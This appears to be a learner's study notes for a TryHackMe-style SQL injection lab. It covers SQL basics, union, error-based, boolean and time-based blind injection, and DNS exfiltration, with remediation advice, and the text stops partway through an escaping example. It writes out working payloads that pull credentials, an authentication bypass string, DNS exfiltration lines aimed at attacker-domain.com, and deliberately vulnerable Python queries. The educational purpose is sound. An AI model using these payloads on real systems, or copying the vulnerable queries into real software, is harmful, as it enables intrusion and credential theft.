# SQL Injection Jr. Pentest 

**What is a database?**
A database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS, which is an acronym for  Database Management System. DBMSs fall into two camps: Relational and Non-Relational; the focus of this room will be on Relational databases; some common ones you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite. We'll explain the difference between Relational and Non-Relational databases at the end of this task, but first, it's important to learn a few terms. 

###### A column containing an integer can also have an auto-increment feature enabled; this gives each row of data a unique number that grows (increments) with each subsequent row. Doing so creates what is called a key field; a key field has to be unique for every row of data, which can be used to find that exact row in SQL queries. 


**Relational Vs Non-Relational Databases:**
A relational database stores information in tables, and often, the tables share information between them; they use columns to specify and define the data being stored and rows actually to store the data. The tables will often contain a column that has a unique ID (primary key), which will then be used in other tables to reference it and cause a relationship between the tables, hence the name relational database.
Non-relational databases, sometimes called NoSQL, on the other hand, are any sort of database that doesn't use tables, columns and rows to store the data. A specific database layout doesn't need to be constructed so each row of data can contain different information, giving more flexibility over a relational database.  Some popular databases of this type are MongoDB, Cassandra and ElasticSearch.

### SQL (MySQL)
- SELECT
    The following query, like the first, returns all the columns by using the * selector, and then the "LIMIT 1" clause forces the database to return only one row of data. Changing the query to "LIMIT 1,1" forces the query to skip the first result, and then "LIMIT 2,1" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.


        select * from users LIMIT 1;
- SELECT WHERE     the where clause; this is how we can finely pick out the exact data we require by returning data that matches our specific clauses:
                select * from users where username !='admin' or username='jon' and password='p4ssword';
- Using the like clause allows you to specify data that isn't an exact match but instead either starts, contains or ends with certain characters by choosing where to place the wildcard character represented by a percentage sign %.


        select * from users where username like 'a%' or '%n' or '%mi%';
- UNION      The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type, and the column order has to be the same.
             SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
- INSERT
  The INSERT statement tells the database we wish to insert a new row of data into the table. "into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for and then "values ('bob','password');" provides the data for the previously specified columns.
>              insert into users (username,password) values ('bob','password123');

- UPDATE   The UPDATE statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "update %tablename% SET" and then select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'" then finally, similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "where username='admin;".
-         update users SET username='root',password='pass123' where username='admin';

- DELETE
    The DELETE statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to return, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.
          delete from users where username='martin';


### SQLi

https://website.thm/blog?id=1 >   SELECT * from blog where id=1 and private=0 LIMIT 1;

Let's pretend article ID 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:
 
https://website.thm/blog?id=2;--

Which would then, in turn, produce the SQL statement:

      SELECT * from blog where id=2;-- and private=0 LIMIT 1;

The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:

      SELECT * from blog where id=2;--

Which will return the article with an ID of 2 whether it is set to public or not

**In-Band SQL Injection**
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


**Error-Based SQL Injection**
This type of SQL Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


**Union-Based SQL Injection**
This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.


### In-band SQL Injection (Classic SQLi) Explained

**In-band SQL Injection** is the most straightforward and common type of SQL injection attack. In this form, the attacker can both **inject malicious SQL code** and **see the results** of the injection directly in the application’s response. This immediate feedback loop makes in-band SQLi easier to exploit than other types like **blind SQL injection** or **out-of-band SQL injection**.

It is also referred to as **classic SQL injection** because it's the form that first emerged as a vulnerability when SQL injection attacks were discovered.

---

### How In-band SQL Injection Works

In-band SQLi occurs when:
- A web application directly includes unsanitized user inputs in SQL queries.
- Attackers manipulate the input fields, URLs, or headers to include malicious SQL commands.
- The result of the attack is shown in the web application’s response (like in a web page or error message).

There are **two main techniques** for exploiting in-band SQL injection:

#### 1. **Error-based SQL Injection**
This technique involves forcing the database to return **error messages** that reveal useful information about the structure of the database, such as table names, column names, or even sensitive data.

#### 2. **Union-based SQL Injection**
In this technique, the attacker uses the `UNION` SQL operator to combine the result of a legitimate query with the result of a malicious query, allowing the attacker to extract data directly in the web application's response.

---

### In-band SQL Injection Breakdown

#### 1. **Error-based SQL Injection**

Some applications are misconfigured in such a way that **SQL error messages** are displayed back to the user in the browser. These error messages often include detailed information about the database structure, which attackers can use to exploit the system further.

##### Example:
Suppose the following URL is used to fetch product information from a database:

```
http://example.com/products?id=10
```

The SQL query behind the scenes might look like:

```sql
SELECT * FROM products WHERE id = 10;
```

An attacker can inject a **malicious query** to cause a database error. For example:

```
http://example.com/products?id=10'
```

This would result in an invalid query like:

```sql
SELECT * FROM products WHERE id = 10';
```

This invalid query will likely cause an error, and if the web application is not configured to hide error messages, the attacker may see something like:

```
SQL error: Syntax error near '10'' at line 1.
```

This response tells the attacker that the application is vulnerable to SQL injection and that they can manipulate the query further.

The attacker can continue injecting payloads that cause different errors and extract useful information. For instance:

```sql
SELECT * FROM users WHERE id = 1 AND extractvalue(1,concat(0x3a,(SELECT database())));
```

This may cause an error message like:

```
SQL error: ... Unknown column 'test_db'...
```

Here, `test_db` would be the name of the current database.

---

#### 2. **Union-based SQL Injection**

In **union-based SQLi**, the attacker uses the `UNION` operator to combine the results of two or more `SELECT` statements into a single result set. This technique allows the attacker to extract data directly from the database and display it in the application’s response.

##### Example:
Let’s say you have a URL like:

```
http://example.com/products?id=10
```

The SQL query behind this might be:

```sql
SELECT name, price FROM products WHERE id = 10;
```

An attacker could inject the following payload to combine the result of the original query with the result of a malicious one:

```
http://example.com/products?id=10 UNION SELECT username, password FROM users;
```

The final SQL query executed by the database would look like this:

```sql
SELECT name, price FROM products WHERE id = 10
UNION
SELECT username, password FROM users;
```

In this case, if the web application doesn’t properly sanitize inputs or limit the result set, the attacker will see **usernames and passwords** displayed on the same page as the product information.

### How Attackers Exploit In-band SQLi

1. **Find a vulnerable input point**: Attackers first identify inputs like URL parameters, forms, or headers where the application directly processes user input into a SQL query.
   
2. **Inject SQL commands**: Using the vulnerable input point, the attacker inserts SQL commands into the existing query structure.

3. **Read the response**: If the application is vulnerable, the attacker can see the results of their SQL injection directly in the browser, making it easier to extract information.

4. **Use `UNION` or cause errors**: Attackers use the `UNION` operator to combine malicious queries with legitimate ones or cause errors to extract valuable information.


### Example Walkthrough of Union-based SQL Injection

#### Step 1: Test the vulnerability
The attacker tries injecting a simple test payload:

```
http://example.com/products?id=10'
```

If an error message or odd behavior is seen, this could indicate a vulnerability.

#### Step 2: Find the number of columns
The attacker will now try to guess the correct number of columns in the query using the `ORDER BY` clause.

```
http://example.com/products?id=10 ORDER BY 1--
```

If this works, they increment the number of columns until they get an error:

```
http://example.com/products?id=10 ORDER BY 3--
```

When the query fails (for example, at column 4), the attacker knows the query has **3 columns**.

#### Step 3: Perform the `UNION` attack
Once the attacker knows how many columns are in the query, they use `UNION` to combine it with a malicious query. The attacker will craft a payload like:

```
http://example.com/products?id=10 UNION SELECT null, username, password FROM users--
```

In this case:
- `null` is used to match the first column (which doesn’t matter to the attacker).
- `username` and `password` are extracted from the `users` table and displayed in the result.

#### Step 4: Extract sensitive information
If successful, the attacker will see usernames and passwords printed in the application’s response. This data can then be used for further attacks.

---

### How to Prevent In-band SQL Injection

1. **Use Prepared Statements (Parameterized Queries)**: Prepared statements ensure that user input is always treated as data, not as executable SQL commands.

2. **Use Stored Procedures**: Stored procedures can limit the type of queries that can be run and prevent ad-hoc SQL code from being executed.

3. **Validate and Sanitize Inputs**: Always sanitize user inputs by escaping special characters (e.g., single quotes `'`) and using whitelists to ensure only valid data is entered.

4. **Use ORM Frameworks**: Object-Relational Mapping (ORM) frameworks abstract SQL queries and provide built-in protections against SQL injection.

5. **Disable Detailed Error Messages**: Ensure the application doesn’t expose detailed SQL error messages to the user.

6. **Principle of Least Privilege**: The database user that the web application uses should have the minimum necessary permissions, restricting the ability to execute harmful commands.


### Conclusion

**In-band SQL Injection** is one of the simplest and most dangerous forms of SQL injection because it allows attackers to inject malicious SQL code and immediately see the results. It is vital to sanitize inputs and use proper query-building techniques to avoid falling victim to this type of attack.



> The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).
> Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure.

![image](https://github.com/user-attachments/assets/82016ecd-4eb5-4013-9e58-17a91403315f)
![image](https://github.com/user-attachments/assets/1d2b1d7c-d666-4b9b-b339-28d34c073539)
![image](https://github.com/user-attachments/assets/685f16f5-0fbd-4938-942d-ca6dbb223e16)
![image](https://github.com/user-attachments/assets/070ddd19-bd08-4cb1-b598-b31d34b7440e)
![image](https://github.com/user-attachments/assets/501baa87-8eed-46c4-8422-f6bd674e9a18)
![image](https://github.com/user-attachments/assets/3fc07338-96e6-48ee-ac7b-1798942e01ce)
![image](https://github.com/user-attachments/assets/26bb5ee8-c7b7-4f13-bf80-c341d85f8645)

### Goal of the Exercise
The objective is to perform an SQL injection attack on a web application that has a vulnerability, allowing you to extract information like the database name, table names, and eventually user credentials (passwords). The web application is not properly securing its SQL queries, so we can manipulate them to get useful data.

### Step-by-Step Breakdown

1. **Initial Query:**
   ```sql
   1 UNION SELECT 1
   ```
   - **What’s happening:** 
     You are trying to use the `UNION` operator, which allows combining the results of two queries. 
     - The first query comes from the original web application, which might look like:
       ```sql
       SELECT * FROM article WHERE id = 1;
       ```
     - You are adding a `UNION SELECT` to try and inject some custom data. But there’s a problem: your custom query doesn’t return the same number of columns as the original query. That’s why you get an **error**.
  
2. **Fixing the Number of Columns:**
   ```sql
   1 UNION SELECT 1, 2
   ```
   - **What’s happening:** 
     You try adding another column (`1, 2`), but you still get an error because the original query is probably expecting more columns.
  
3. **Getting the Right Number of Columns:**
   ```sql
   1 UNION SELECT 1, 2, 3
   ```
   - **What’s happening:**
     Now you’ve matched the number of columns that the original query returns, and the error is gone. The page loads successfully because the SQL query is valid now.

4. **Making the Original Query Return No Results:**
   ```sql
   0 UNION SELECT 1, 2, 3
   ```
   - **What’s happening:** 
     By changing the `id` to `0`, you ensure that the original query (`SELECT * FROM article WHERE id = 0`) returns **no rows**. This forces the application to display the data from your **injected query** (`UNION SELECT 1, 2, 3`), and not the legitimate article data.

5. **Extracting the Database Name:**
   ```sql
   0 UNION SELECT 1, 2, database()
   ```
   - **What’s happening:**
     You use the `database()` function to retrieve the name of the current database. When you run this query, the webpage now shows the name of the database instead of the number `3`. In this case, the database name is **`sqli_one`**.

6. **Finding Table Names in the Database:**
   ```sql
   0 UNION SELECT 1, 2, group_concat(table_name) 
   FROM information_schema.tables 
   WHERE table_schema = 'sqli_one'
   ```
   - **What’s happening:**
     Now, you’re using a **metadata table** called `information_schema.tables`. This special table contains information about all the tables in the database.
     - `group_concat(table_name)` combines all the table names into a single output, separated by commas.
     - The `WHERE table_schema = 'sqli_one'` part ensures that you are only retrieving table names from the database **`sqli_one`**.

   - The result should be a list of all the tables in the `sqli_one` database. Based on the exercise, we know one of the tables is named **`staff_users`**.

7. **Finding Column Names in the `staff_users` Table:**
   ```sql
   0 UNION SELECT 1, 2, group_concat(column_name) 
   FROM information_schema.columns 
   WHERE table_name = 'staff_users'
   ```
   - **What’s happening:**
     Now that you know the `staff_users` table exists, you want to know what columns (fields) are in that table. You query the **`information_schema.columns`** table, which holds details about columns.
     - `group_concat(column_name)` combines the column names into a single output.
     - `WHERE table_name = 'staff_users'` ensures you are only retrieving column names from the `staff_users` table.

   - The result should be something like `id, username, password`, indicating the `staff_users` table has these three columns.

8. **Extracting Usernames and Passwords:**
   ```sql
   0 UNION SELECT 1, 2, group_concat(username, ':', password SEPARATOR '<br>') 
   FROM staff_users
   ```
   - **What’s happening:**
     Now you’re targeting the `staff_users` table to extract usernames and passwords. Here’s what the query is doing:
     - `group_concat(username, ':', password)` concatenates the usernames and passwords with a colon (`:`) in between.
     - `SEPARATOR '<br>'` ensures that each username-password pair is displayed on a new line using HTML `<br>` tags.
   
   - The result is something like:
     ```
     admin:password
     martin:pa$$word
     jim:work123
     ```

   This final step gives you the actual **usernames and passwords** from the `staff_users` table.

### Summary

1. **Bypassed Errors**: You figured out how many columns were in the original query by trial and error.
2. **Extracted Information**:
   - First, you extracted the **database name**.
   - Then, you extracted the **table names**.
   - After that, you extracted the **column names** for a specific table (`staff_users`).
   - Finally, you pulled out **usernames and passwords** from the `staff_users` table.
   
### Takeaways:

- You used the **information_schema** database to explore the structure of the database, which is a common technique in SQL injection attacks.
- The **group_concat()** function helped combine multiple rows into a single string, making it easier to read and display multiple values.

### What Next?
You could try extending this by using tools like **sqlmap** (an automated SQL injection tool) to see how attackers automate these kinds of queries. Or, you could learn how to prevent SQL injection attacks by using parameterized queries and prepared statements in coding. 


### Blind SQLi





### Blind SQL Injection (Blind SQLi) Explained

**Blind SQL Injection** is a type of SQL injection where the attacker cannot see the result of the injection directly in the web page output. This happens because the web application doesn't return the database's query output in the HTML response, but it still executes the SQL code in the backend. 

In Blind SQLi, the attacker must rely on indirect ways to extract information from the database, such as **true/false conditions** or **timing delays** to determine if their payloads worked.

Let’s break it down.


### How Blind SQL Injection Works:

In a normal **SQL Injection**, the attacker would directly see results, like when querying for usernames or passwords. However, in **Blind SQL Injection**, the attacker injects SQL code, but instead of directly seeing the results, they have to guess and ask the database true/false-style questions or observe time delays to infer information. There are **two main types of Blind SQL Injection**:

#### 1. **Boolean-based Blind SQL Injection**
This method is like playing a guessing game with yes/no answers. Here's the process:

1. **Inject a SQL query** with a condition that results in **TRUE** or **FALSE** (e.g., `id=1` or `id=1 AND 1=1`).
2. **Observe how the website responds**:
   - If the condition is true (valid), the website may load normally or behave in a certain expected way.
   - If the condition is false (invalid), the website may behave differently (e.g., no data shown, error, or redirected).
3. The attacker can ask the database "yes/no" questions by testing conditions one by one. This is used to extract data, such as the name of the database, version, table names, etc.

##### Example:
Suppose a website has a vulnerable URL like:
```http://example.com/products?id=1```

To exploit this vulnerability, the attacker could inject:

```http://example.com/products?id=1 AND 1=1```
- This is **true**, so the page loads normally.

```http://example.com/products?id=1 AND 1=2```
- This is **false**, so the page behaves differently (maybe no data is shown or the structure changes).

Using this method, the attacker could begin testing conditions that help extract information.

##### Extracting data:
Let’s say the attacker wants to know if the first letter of the database name is "A." They might inject:

```http://example.com/products?id=1 AND SUBSTRING((SELECT database()),1,1)='A'```
- If the condition is **true**, the page loads normally.
- If the condition is **false**, the page behaves differently.

By repeating this process letter by letter, the attacker can extract the name of the database.


#### 2. **Time-based Blind SQL Injection**
Time-based Blind SQLi relies on **delays** to infer if the SQL query is working.

1. The attacker injects a **SQL query** that causes a delay in the response if the condition is true.
2. The attacker measures the time it takes for the server to respond and guesses whether the query is valid based on the delay.

##### Example:
Using the same vulnerable URL (`http://example.com/products?id=1`), the attacker injects:

```http://example.com/products?id=1 AND IF(1=1, SLEEP(5), 0)```
- If the query condition is true (1=1), the page will pause for **5 seconds** before loading.
- If the condition is false (1=2), the page will load **normally** without delay.

##### Extracting Data:
The attacker can then use this technique to extract data, similar to Boolean-based Blind SQLi. For example, they could guess each letter of the database name by checking for conditions like:

```http://example.com/products?id=1 AND IF(SUBSTRING((SELECT database()),1,1)='A', SLEEP(5), 0)```

If the first letter is "A," the page will pause for 5 seconds, confirming the guess.


### How Attackers Use Blind SQLi

1. **Guess database information**: Attackers typically begin by trying to figure out what database is in use (e.g., MySQL, PostgreSQL).
2. **Determine structure**: After identifying the database, they try to learn the names of the tables and columns.
3. **Extract sensitive information**: Finally, they can extract data (like usernames and passwords) by asking a series of "yes/no" questions.

### Steps to Perform Blind SQL Injection

1. **Identify a Vulnerable Input Field**: Find a web page where user inputs are passed to a SQL query (e.g., login forms, search boxes, URLs with parameters).
   
2. **Test with Boolean-based Queries**:
   - Try injecting simple `AND` conditions to observe changes in the page's behavior.
     ```id=1 AND 1=1``` (expected behavior, page loads normally).
     ```id=1 AND 1=2``` (unexpected behavior, no data displayed).

3. **Ask Questions Using Conditions**:
   - Start querying for database names, table names, or other sensitive data using the **SUBSTRING** or **IF** function.
     ```id=1 AND SUBSTRING((SELECT database()),1,1)='A'```

4. **Refine Your Questions**: Slowly extract data character by character, using **binary search methods** or simple iterative techniques.

5. **Use Time-based Queries (if needed)**: If you can't see page changes, use `SLEEP()` to test for delay responses.


### How to Prevent Blind SQL Injection

- **Use Parameterized Queries**: This is the most effective way to avoid SQL injection. Always use prepared statements with bound parameters.
  
- **Use ORM Frameworks**: Object-Relational Mapping (ORM) frameworks abstract away SQL queries, helping reduce the risk of injection.

- **Validate User Inputs**: Ensure user inputs are sanitized. Never trust input from GET/POST requests.

- **Limit Database Privileges**: Follow the principle of least privilege. Ensure that web applications have limited access to the database and cannot perform administrative tasks.


### Conclusion

Blind SQL Injection is stealthier and more time-consuming than regular SQL Injection, but it is equally dangerous. Attackers can exploit it to extract sensitive information by carefully observing the application’s behavior or timing.

### Practical 

- **Authentication Bypass**      (Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more in whether the two make a matching pair in the users table. )

  ![image](https://github.com/user-attachments/assets/30b0de03-7f7e-47bd-b8f8-b7d189a784b8)
-  **Boolean BAesd**      Boolean-based SQL Injection refers to the response we receive from our injection attempts, which could be a true/false, yes/no, on/off, 1/0 or any response that can only have two outcomes. That outcome confirms that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, with just these two responses, it's possible to enumerate a whole database structure and contents.
  ![image](https://github.com/user-attachments/assets/b38a9192-894e-4c1a-a4b9-bc1d8e7a9692)
![image](https://github.com/user-attachments/assets/7e67e3c1-249c-4e6f-81f0-1d82a503460b)
![image](https://github.com/user-attachments/assets/4258aa51-2cf9-4ae1-aeda-df527b5f01f5)
![image](https://github.com/user-attachments/assets/1d734337-5045-4558-892c-9525a090d331)
![image](https://github.com/user-attachments/assets/d8a9cd94-1fe5-4d01-8334-1884fa0808cb)
![image](https://github.com/user-attachments/assets/934d943f-7492-438b-8cbf-7843bad7ea7f)


### Boolean-based SQL Injection Overview:
In **Boolean-based SQL Injection**, you don’t directly get the data, but instead, the web app responds in **two possible ways**:
1. **True** (something exists, query worked) 
2. **False** (nothing exists, query failed).

This means you can ask the database **yes/no questions** to slowly figure out its contents. You get feedback by seeing whether the app shows **“true”** (like `{"taken": true}`) or **“false”** (like `{"taken": false}`).

Now, let's walk through the **practical example** step by step.



### Practical Example Breakdown

1. **Initial Setup**:
   You are given a URL:
   ```
   https://website.thm/checkuser?username=admin
   ```
   - This URL checks if the username `admin` exists. 
   - When you visit the page, you see a response: `{"taken":true}`.
   - This means the username `admin` is **taken** (it exists).

   When you change the URL to something like:
   ```
   https://website.thm/checkuser?username=admin123
   ```
   - You see `{"taken": false}`, meaning the username `admin123` **does not exist**.

2. **SQL Query Behind the Scenes**:
   The app is likely running an SQL query like this:
   ```sql
   SELECT * FROM users WHERE username = 'admin' LIMIT 1;
   ```
   - It checks if a user with the username `admin` exists in the `users` table.


### Performing SQL Injection:

#### Step 1: Finding the Number of Columns

The first step in many SQL injection attacks is to figure out **how many columns** the query is working with. This is done using the **`UNION`** statement, which allows you to combine the results of one query with another.

- You start with this payload:
   ```
   admin123' UNION SELECT 1;--
   ```
   - You inject `' UNION SELECT 1;--` to test if the query can combine with your malicious one.
   - The app responds with `{"taken": false}`, meaning it didn’t work. This tells you that there’s more than 1 column in the table.
   
- You then try:
   ```
   admin123' UNION SELECT 1,2;--
   ```
   - Again, `{"taken": false}`, meaning still not enough columns.
   
- Finally, you try:
   ```
   admin123' UNION SELECT 1,2,3;--
   ```
   - Now, you see `{"taken": true}`, meaning you’ve found the correct number of columns, which is **3**.

#### Step 2: Extracting the Database Name

Now that you know there are 3 columns, you can start trying to extract information from the database. To begin, you’ll try to **find the database name**.

- You use the `database()` function, which gives the name of the database. You craft your payload like this:
   ```
   admin123' UNION SELECT 1,2,3 WHERE database() like '%';--
   ```
   - The **`%`** symbol is a **wildcard** that matches any value, so this will always return true. You see `{"taken": true}`, confirming that the query works.

- You then modify the query to find out what the database name starts with. You try this:
   ```
   admin123' UNION SELECT 1,2,3 WHERE database() like 's%';--
   ```
   - If the app responds with `{"taken": true}`, this means the database name starts with `s`.

- You continue guessing the next characters by trying:
   ```
   admin123' UNION SELECT 1,2,3 WHERE database() like 'sq%';--
   ```
   - You keep adding letters until you find the full name of the database (in this case, `sqli_three`).

#### Step 3: Finding Table Names

Now that you know the database name is `sqli_three`, you need to find the **tables** inside the database.

- You’ll use the `information_schema.tables` table, which holds information about all tables in the database:
   ```
   admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' AND table_name LIKE 'a%';--
   ```
   - This checks if there is a table in the `sqli_three` database that starts with the letter `a`. 
   - If `{"taken": false}`, then there’s no such table. You try different letters (`b%`, `c%`, etc.) until you find that there’s a table called `users`.

#### Step 4: Finding Column Names

Next, you need to find the **columns** inside the `users` table (which stores information like usernames and passwords).

- You query the `information_schema.columns` table to find the column names in the `users` table:
   ```
   admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema = 'sqli_three' AND table_name = 'users' AND column_name LIKE 'a%';--
   ```
   - Again, if `{"taken": false}`, you try other letters until you find that the first column is `id`.

- You repeat this process to discover more columns (`username` and `password`).

#### Step 5: Extracting Data (Finding the Username and Password)

Now that you know the `users` table has columns named `id`, `username`, and `password`, you can extract actual data (like the admin’s password).

- First, you find out the usernames by using:
   ```
   admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--
   ```
   - You cycle through letters until you confirm the existence of the username `admin`.

- Finally, to extract the password for `admin`, you use:
   ```
   admin123' UNION SELECT 1,2,3 FROM users WHERE username = 'admin' AND password LIKE 'a%';--
   ```
   - You keep guessing the password by trying different characters (`b%`, `c%`, etc.) until you find that the password is `3845`.


### Conclusion:
Through **Boolean-based SQL injection**, you slowly extract information from the database by asking true/false questions. In this example, you were able to:
- Find the correct number of columns.
- Discover the database name (`sqli_three`).
- Find the tables (`users`).
- Enumerate the columns (`id`, `username`, `password`).
- Finally, extract the `admin` username and password (`3845`).

You can now use this information to log in to the site. The key technique here is using **Boolean logic** to infer information based on **true/false responses**.


### Time Based Blind SQLi

A time-based blind SQL injection is very similar to the  boolean-based one in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 
![image](https://github.com/user-attachments/assets/287f641b-e7f8-4ac7-8c0f-9342b1d40b85)


### Out of Band SQLi

Out-of-band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.

Great question! Yes, **DNS (Domain Name System)** can be used to exfiltrate data from a database in a technique called **DNS Data Exfiltration**. Even though DNS is meant for resolving domain names into IP addresses, attackers can manipulate it to send or receive small chunks of data through DNS queries and responses. Here's how it works:

### **How DNS Exfiltration Works:**

#### 1. **The Role of DNS:**
DNS is a protocol that resolves domain names (like `example.com`) into IP addresses. Normally, when you visit a website, your device sends a DNS query to a DNS server to find the correct IP address for the domain.

#### 2. **Manipulating DNS Queries:**
Attackers exploit the fact that DNS queries often pass through firewalls and security filters, since DNS traffic is usually considered safe and is allowed by default. By embedding data (like sensitive information from a database) inside DNS queries, attackers can send that data to an external server under their control.

#### 3. **Step-by-Step DNS Data Exfiltration:**

   - **Compromising the Database:** The attacker gains access to the database (possibly using an attack like SQL Injection) and can run custom queries.
   
   - **Encoding Data into DNS Requests:** Instead of sending data directly over suspicious channels (like HTTP), the attacker splits the stolen data (e.g., a password, credit card number) into small chunks and encodes it in DNS queries.
     - For example, if an attacker extracts a password `abc123` from a database, they can encode it in subdomains like:
       ```
       a.b.c.1.2.3.attacker-domain.com
       ```
       or
       ```
       abc123.attacker-domain.com
       ```

   - **Sending the DNS Query:** The attacker sends these specially crafted DNS queries from the compromised machine to a DNS server controlled by the attacker. For instance, querying the domain `abc123.attacker-domain.com` would pass through the organization's DNS resolver and eventually reach the attacker's DNS server.

   - **Receiving the Exfiltrated Data:** The attacker's DNS server receives the query (`abc123.attacker-domain.com`) and extracts the sensitive information embedded in the query (in this case, `abc123`).

#### 4. **Why DNS is Effective for Exfiltration:**
   - **Traffic Often Allowed:** DNS is usually trusted and allowed through firewalls, so it often bypasses security measures.
   - **DNS is Lightweight:** DNS queries are small and don't raise alarms like larger file transfers might.
   - **Hard to Detect:** Since DNS queries are frequent and normal in network activity, this type of exfiltration can be hard to notice unless special DNS monitoring is in place.

#### 5. **Real-World Example of DNS Exfiltration:**
   - An attacker might run an SQL injection attack to get sensitive information (like user credentials).
   - Using the compromised server, they craft a DNS query:
     ```
     johndoe-password123.attacker.com
     ```
   - The compromised server sends this DNS query out to the legitimate DNS servers, which resolve it to the attacker's DNS server.
   - The attacker’s server logs the query and extracts `johndoe-password123`, completing the exfiltration.

### **How to Detect and Prevent DNS Exfiltration:**
1. **Monitor DNS Traffic:** Look for unusually long or suspicious domain names or high volumes of DNS requests going to unknown domains.
2. **Restrict DNS Queries:** Use internal DNS servers and block direct outbound DNS traffic to external DNS servers.
3. **DNS Query Size Limits:** Limit the size of DNS queries to prevent large amounts of data from being exfiltrated.
4. **DNS Security Solutions:** Use DNS security solutions like DNS tunneling detection tools, which can detect suspicious patterns in DNS traffic.

By using DNS this way, attackers can stealthily move data out of a network, bypassing many traditional security controls.

### REMEDIATION

Remediation

As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the advice below:


Prepared Statements (With Parameterized Queries):

In a prepared query, the first thing a developer writes is the SQL query, and then any user inputs are added as parameters afterwards. Writing prepared statements ensures the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look much cleaner and easier to read.


Input Validation:

Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 


Escaping User Input:

Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.



### **1. Prepared Statements (with Parameterized Queries):**

#### **What it is:**
Prepared statements (or parameterized queries) are a method where the structure of the SQL query is defined first, and then the user input is safely added as a parameter. This ensures that the SQL engine knows what part of the input is **data** and what part is the **query**, preventing malicious input from altering the SQL command.

#### **Example Without Prepared Statements (Vulnerable Code):**

Imagine a login function where a user inputs a username and password.

```python
# Vulnerable code in Python
username = input("Enter username: ")
password = input("Enter password: ")

query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

An attacker could input the following to bypass login:

- **Username:** `admin`
- **Password:** `' OR '1'='1' --`

The query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --'
```

Here, the `OR '1'='1'` condition is always **true**, so the attacker logs in without needing a valid password!


#### **Example With Prepared Statements (Secure Code):**

Using prepared statements, the user input is treated as **data**, not **part of the SQL query**:

```python
# Secure code with prepared statements (Python with SQLite example)
import sqlite3

conn = sqlite3.connect('database.db')
cursor = conn.cursor()

# Prepared statement with placeholders
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))

# The input is now safely passed as data, preventing injection
```

No matter what the attacker inputs, it will be treated as plain data, and the query’s structure will not change. Even if the user enters something malicious like `' OR '1'='1'`, it won't affect the query because it is now treated as part of the **password** string, not SQL code.



### **2. Input Validation:**

#### **What it is:**
Input validation ensures that the data users submit meets the expected format before being processed. You can restrict input to only allow specific characters or patterns, preventing attackers from entering harmful data.

#### **Example Without Input Validation (Vulnerable Code):**

If an application accepts any string without restriction, an attacker could input special characters like `'`, `--`, or `;` to manipulate the SQL query:

```python
user_input = input("Enter your username: ")
query = f"SELECT * FROM users WHERE username = '{user_input}'"
```

Here, an attacker could enter:

- **User Input:** `' OR 1=1 --`

This would turn the query into:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --'
```

This query would return all users from the database!



#### **Example With Input Validation (Secure Code):**

You can apply **input validation** by creating an allowlist (also called a "whitelist") of acceptable characters. For example, if usernames should only contain alphanumeric characters, reject anything that doesn’t match:

```python
import re

def is_valid_username(username):
    # This regex allows only letters and numbers (alphanumeric)
    return re.match("^[a-zA-Z0-9_]+$", username)

user_input = input("Enter your username: ")

if is_valid_username(user_input):
    query = f"SELECT * FROM users WHERE username = '{user_input}'"
else:
    print("Invalid username format")
```

Here, if the attacker tries to input `' OR 1=1 --`, it will be rejected because only alphanumeric characters are allowed.


### **3. Escaping User Input:**

#### **What it is:**
Escaping involves **adding special characters** (like a backslash `\`) before characters that have a special meaning in SQL, such as `'`, `"`, `\`, or `$`. This ensures these characters are treated as **plain text** and not **commands**.

#### **Example Without Escaping (Vulnerable Code):**

```python
user_input = "O'Reilly"
